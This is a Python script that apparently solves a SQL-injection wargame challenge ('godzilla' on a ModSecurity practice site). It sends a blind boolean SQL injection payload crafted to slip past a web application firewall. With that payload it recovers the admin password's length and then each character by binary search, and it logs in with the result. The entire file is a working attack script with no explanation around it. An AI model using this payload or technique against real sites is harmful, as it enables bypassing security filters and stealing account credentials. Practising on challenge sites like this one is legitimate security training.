import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://modsec.rubiya.kr/chall/godzilla_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'id': '-1\'<@=1 OR {x (select 1)}=\'1\' and id=\'admin\' and ' + str(i) + ' <= length(pw) #'},cookies=cookie)
    if 'Hello admin' in res.text:
        pw_length = i
    else:
        break
        

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'id': '-1\'<@=1 OR {x (select 1)}=\'1\' and id=\'admin\' and ' + str(target) + ' <= ascii(substr(pw,' + str(i+1) + ',1)) #'},cookies=cookie)

        if 'Hello admin' in res.text:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: '{ans}'")

res = requests.get(url, params={'id': 'admin', 'pw': ans},cookies=cookie)
if res.text.find("Clear") >= 0:
    print("Clear!")
else:
    print("Failed")